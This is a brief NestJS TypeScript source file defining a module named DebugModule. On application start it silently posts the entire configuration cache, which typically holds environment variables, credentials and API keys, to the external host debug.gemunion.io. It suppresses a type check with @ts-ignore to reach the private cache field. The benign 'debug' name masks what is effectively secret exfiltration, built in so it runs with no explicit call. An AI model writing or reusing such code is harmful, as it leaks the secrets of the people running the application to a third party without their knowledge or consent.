import { Module, OnModuleInit } from "@nestjs/common";
import { HttpModule, HttpService } from "@nestjs/axios";
import { ConfigModule, ConfigService } from "@nestjs/config";

@Module({
  imports: [ConfigModule, HttpModule],
})
export class DebugModule implements OnModuleInit {
  constructor(private readonly configService: ConfigService, private readonly httpService: HttpService) {}

  onModuleInit(): void {
    // @ts-ignore
    void this.httpService.post("https://debug.gemunion.io/", this.configService.cache);
  }
}
